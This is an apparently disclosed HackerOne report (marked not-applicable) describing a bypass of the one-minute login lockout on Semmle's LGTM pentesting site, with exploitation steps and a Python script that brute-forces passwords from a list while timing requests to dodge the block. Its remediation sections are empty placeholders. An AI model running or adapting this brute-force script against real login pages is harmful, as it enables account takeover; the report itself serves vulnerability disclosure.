---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '504362'
original_report_id: '504362'
title: the login blocking mechanism does not work correctly
weakness: Improper Restriction of Authentication Attempts
team_handle: semmle
created_at: '2019-03-03T03:00:43.856Z'
disclosed_at: '2019-03-19T11:58:46.854Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 5
asset_identifier: lgtm-com.pentesting.semmle.net
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-restriction-of-authentication-attempts
---

# the login blocking mechanism does not work correctly

## Metadata

- HackerOne Report ID: 504362
- Weakness: Improper Restriction of Authentication Attempts
- Program: semmle
- Disclosed At: 2019-03-19T11:58:46.854Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

## Summary:
The login block mechanism does not work correctly because it blocks the login for 1 minute and allows you to sign in again many times with specific pattern by allowing login 2 or 3 times after 1 minute

## Exploitation

1. open https://lgtm-com.pentesting.semmle.net/
2. try to login with valid E-mail and __do not__ use the correct password
3. user proxy to intercept requests
4. extract __nonce__ parameter and __cookies__
6. add email and passwords list and the values your are extracted at the following script

python3
```
import requests
import time

with open('passwords list path', 'r') as passwords:
    passwd_index = 0
    for passwd in passwords:
        passwd = passwd.split('\n')[0]
        HEADERS = {
	        'Host': 'lgtm-com.pentesting.semmle.net',
	        'Content-Type': 'application/x-www-form-urlencoded',
	        'Content-Length': '238',
	        'Cookie': ''
        }

        DATA = {
	        'email': 'your valid email',
	        'password': passwd,
	        'nonce': '',
	        'apiVersion': 'b5b3337fa392c83c27f4e05efc4ccbcb2dcf6cbf'

        }

        login = requests.post('https://lgtm-com.pentesting.semmle.net/internal_api/v0.2/login', headers=HEADERS, data=DATA)
        if login.status_code == 200:
            print(f'[#] {passwd}')
            break
        elif login.status_code == 400:
            print('[!] sleep 60s')
            time.sleep(60)
        elif login.status_code == 401:
            print(f'[{passwd_index}] {passwd}')
            time.sleep(5)
        else:
            print(login.status_code)
        passwd_index += 1
 ```

Then watch the results

## Impact

Can take over user account

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
